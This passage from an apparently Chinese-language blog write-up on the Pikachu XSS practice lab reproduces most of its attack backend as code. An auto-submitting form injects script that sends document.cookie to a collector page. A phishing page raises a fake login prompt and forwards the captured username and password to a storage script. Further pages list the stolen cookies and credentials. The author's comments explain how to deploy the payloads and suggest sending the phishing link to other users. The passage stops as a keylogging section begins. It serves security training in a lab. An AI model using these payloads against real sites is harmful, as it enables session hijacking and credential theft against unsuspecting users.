class="line"></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"># http://192.168.135.130:49154/pkxss/xcookie/post.html 源码</span><br><span class="line">#</span><br><span class="line"># 这个界面就和之前的 xss 第二题的界面相同了，但多了一个暗中隐藏的恶意 post 表单（ script 标签包裹部分）</span><br><span class="line"># 即当访问 post.html 时，解析到 form 标签时</span><br><span class="line"># 跳转访问 xss_reflected_post.php ，之后的两个 input 标签作为其 post 参数一起传入</span><br><span class="line"># onload 通常用于 <span class="tag">&lt;<span class="name">body</span>&gt;</span> 元素，在页面完全载入后(包括图片、css文件等等。)执行脚本代码</span><br><span class="line"># 即页面全部显示后，通过 onload 事件实现自动化的点击事件，相当于人工点击 submit 按钮</span><br><span class="line"># 若跳转时发现没有登录，则转而跳转到 post_login.php 登陆界面，成功才跳转 xss_reflected_post.php 界面</span><br><span class="line"># 此时，已经无法捕获用户 cookie，除非再次访问 post.html</span><br><span class="line"># 故，仅有在用户登录 post_login.php 访问 post.html 才能触发获取 cookie</span><br><span class="line"># 再次理解：通过 post 表单与 onload 事件组合实现用户发起访问 xss_reflected_post.php 的请求</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;postsubmit&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.1.4/pikachu/vul/xss/xsspost/xss_reflected_post.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;xssr_in&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">value</span>=</span></span><br><span class="line"><span class="tag">    <span class="string">&quot;&lt;script&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">document.location = &#x27;http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;</span></span></span><br><span class="line"><span class="string"><span class="tag">        &lt;/script&gt;&quot;</span></span></span><br><span class="line"><span class="tag">         /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment">&lt;script&gt;</span></span><br><span class="line"><span class="comment">document.write(&#x27;&lt;img src=&quot;http://127.0.0.1/antxss/xcookie/cookie.php?cookie=&#x27;+document.cookie+&#x27;&quot; width=&quot;0&quot; height=&quot;0&quot; border=&quot;0&quot; /&gt;&#x27;);</span></span><br><span class="line"><span class="comment">&lt;/script&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&lt;script&gt;</span></span><br><span class="line"><span class="comment">document.location = &#x27;http://127.0.0.1/antxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;</span></span><br><span class="line"><span class="comment">&lt;/script&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 127.0.0.1/pkxss/xcookie/pkxss_cookie_result.php 源码</span></span><br><span class="line"><span class="comment"># 为什么我要放这个页面的源码，打sql上瘾了，看到删除操作就行试试，</span></span><br><span class="line"><span class="comment"># 注意：</span></span><br><span class="line"><span class="comment"># is_numeric() 函数用于检测变量是否为数字或数字字符串。</span></span><br><span class="line"><span class="comment"># 如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE。</span></span><br><span class="line"><span class="comment"># 所以，写永真式注入是不行喽，有空回来再看看吧</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/config.inc.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/mysql.inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$link</span>=<span class="title function_ invoke__">connect</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否登录，没有登录不能访问</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">check_login</span>(<span class="variable">$link</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:../pkxss_login.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="title function_ invoke__">escape</span>(<span class="variable">$link</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;delete from cookies where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;cookie搜集结果&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;../antxss.css&quot;</span> /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;title&quot;</span>&gt;</span><br><span class="line">&lt;h1&gt;pikachu Xss 获取cookies结果&lt;/h1&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;../xssmanager.php&quot;</span>&gt;返回首页&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;xss_main&quot;</span>&gt;</span><br><span class="line">&lt;table border=<span class="string">&quot;1px&quot;</span> cellpadding=<span class="string">&quot;10&quot;</span> cellspacing=<span class="string">&quot;1&quot;</span> bgcolor=<span class="string">&quot;#5f9ea0&quot;</span>&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;id&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;time&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;ipaddress&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;cookie&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;referer&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;useragent&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;删除&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;select * from cookies&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&lt;&lt;&lt;A</span></span><br><span class="line"><span class="string">    &lt;tr&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;<span class="subst">&#123;$data[&#x27;id&#x27;]&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;<span class="subst">&#123;$data[&#x27;time&#x27;]&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;<span class="subst">&#123;$data[&#x27;ipaddress&#x27;]&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;<span class="subst">&#123;$data[&#x27;cookie&#x27;]&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;<span class="subst">&#123;$data[&#x27;referer&#x27;]&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;<span class="subst">&#123;$data[&#x27;useragent&#x27;]&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;&lt;a href=&quot;pkxss_cookie_result.php?id=<span class="subst">&#123;$data[&#x27;id&#x27;]&#125;</span>&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">    &lt;/tr&gt;</span></span><br><span class="line"><span class="string">A</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220121/image.1r2p0647si68.webp" alt="image"></p><h2 id="钓鱼结果"><a href="#钓鱼结果" class="headerlink" title="钓鱼结果"></a>钓鱼结果</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://192.168.135.130:49154/pkxss/xfish/pkxss_fish_result.php 源码</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 查看钓鱼结果，不分析</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/config.inc.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/mysql.inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$link</span>=<span class="title function_ invoke__">connect</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否登录，没有登录不能访问</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">check_login</span>(<span class="variable">$link</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:../pkxss_login.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="title function_ invoke__">escape</span>(<span class="variable">$link</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;delete from fish where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;钓鱼结果&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;../antxss.css&quot;</span> /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;title&quot;</span>&gt;</span><br><span class="line">&lt;h1&gt;pikachu Xss 钓鱼结果&lt;/h1&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;../xssmanager.php&quot;</span>&gt;返回首页&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;result&quot;</span>&gt;</span><br><span class="line">    &lt;table <span class="class"><span class="keyword">class</span>=&quot;<span class="title">tb</span>&quot; <span class="title">border</span>=&quot;1<span class="title">px</span>&quot; <span class="title">cellpadding</span>=&quot;10&quot; <span class="title">cellspacing</span>=&quot;1&quot; <span class="title">bgcolor</span>=&quot;#5<span class="title">f9ea0</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">td</span> <span class="title">class</span>=&quot;1&quot;&gt;<span class="title">id</span>&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">td</span> <span class="title">class</span>=&quot;1&quot;&gt;<span class="title">time</span>&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">td</span> <span class="title">class</span>=&quot;1&quot;&gt;<span class="title">username</span>&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">td</span> <span class="title">class</span>=&quot;1&quot;&gt;<span class="title">password</span>&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">td</span> <span class="title">class</span>=&quot;2&quot;&gt;<span class="title">referer</span>&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">td</span> <span class="title">class</span>=&quot;2&quot;&gt;操作&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">    $<span class="title">query</span>=&quot;<span class="title">select</span> * <span class="title">from</span> <span class="title">fish</span>&quot;;</span></span><br><span class="line"><span class="class">    $<span class="title">result</span>=<span class="title">mysqli_query</span>($<span class="title">link</span>, $<span class="title">query</span>);</span></span><br><span class="line"><span class="class">    <span class="title">while</span>($<span class="title">data</span>=<span class="title">mysqli_fetch_assoc</span>($<span class="title">result</span>))</span>&#123;</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&lt;&lt;&lt;A</span></span><br><span class="line"><span class="string">    &lt;tr&gt;</span></span><br><span class="line"><span class="string">        &lt;td class=&quot;1&quot;&gt;<span class="subst">&#123;$data[&#x27;id&#x27;]&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;td class=&quot;1&quot;&gt;<span class="subst">&#123;$data[&#x27;time&#x27;]&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;td class=&quot;1&quot;&gt;<span class="subst">&#123;$data[&#x27;username&#x27;]&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;td class=&quot;1&quot;&gt;<span class="subst">&#123;$data[&#x27;password&#x27;]&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;td class=&quot;2&quot;&gt;<span class="subst">&#123;$data[&#x27;referer&#x27;]&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">         &lt;td&gt;&lt;a href=&quot;pkxss_fish_result.php?id=<span class="subst">&#123;$data[&#x27;id&#x27;]&#125;</span>&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">    &lt;/tr&gt;</span></span><br><span class="line"><span class="string">A</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$html</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/table&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;r</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://192.168.135.130:49154/pkxss/xfish/xfish.php 源码</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 钓鱼到的数据发送攻击者数据库</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/config.inc.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/mysql.inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$link</span>=<span class="title function_ invoke__">connect</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$referer</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$referer</span>.=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">    <span class="variable">$time</span>=<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d g:i:s&#x27;</span>);</span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;insert fish(time,username,password,referer) </span></span><br><span class="line"><span class="string">    values(&#x27;<span class="subst">$time</span>&#x27;,&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;,&#x27;<span class="subst">$referer</span>&#x27;)&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://192.168.135.130:49154/pkxss/xfish/fish.php 源码</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 钓鱼页面</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 使用说明：</span></span><br><span class="line"><span class="comment"># 需要将 header(&quot;Location: http://192.168.1.15/pkxss/xfish/xfish.php?username=&#123;$_SERVER[PHP_AUTH_USER]&#125; 中的 IP 修改为自己管理后台的 IP，如笔者的 192.168.135.130:49154</span></span><br><span class="line"><span class="comment"># 钓鱼页面单次出现，再次刷新将不触发</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 注意：</span></span><br><span class="line"><span class="comment"># header(&quot;Location 处语句需要连接起来才能实现真正的跳转，此处以完善</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 分析：</span></span><br><span class="line"><span class="comment"># 当用户访问该界面并根据提示输入数据时，将携带输入进行跳转 xfish.php 页面，实现数据传入数据库</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># payload：</span></span><br><span class="line"><span class="comment"># 配合 xss 漏洞使用</span></span><br><span class="line">&lt;img src=<span class="string">&quot;http://192.168.135.130:49154/pkxss/xfish/fish.php&quot;</span> /&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot; http://192.168.135.130:49154/pkxss/xfish/fish.php&quot;</span>&gt;中国人不骗中国人&lt;/script&gt;</span><br><span class="line"><span class="comment"># 也可以直接把钓鱼URL发给其他用户：http://192.168.135.130:49154/pkxss/xfish/fish.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// var_dump($_SERVER);</span></span><br><span class="line"><span class="keyword">if</span> ((!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) || (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>]))) &#123;</span><br><span class="line"><span class="comment">//发送认证框，并给出迷惑性的info</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;WWW-Authenticate: Basic realm=&#x27;认证&#x27;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Authorization Required.&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>  ((<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) &amp;&amp; (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>])))&#123;</span><br><span class="line"><span class="comment">//将结果发送给搜集信息的后台,请将这里的IP地址修改为管理后台的IP</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://192.168.1.15/pkxss/xfish/xfish.php?username=<span class="subst">&#123;$_SERVER[PHP_AUTH_USER]&#125;</span>&amp;password=<span class="subst">&#123;$_SERVER[PHP_AUTH_PW]&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><ul><li>在实施之前先来了解一下–跨域：</li></ul><p>举例：<a class="link" target="_blank" rel="noopener" href="https://fanyi.baidu.com/#en/zh/admin">https://fanyi.baidu.com/#en/zh/admin<i class="fas 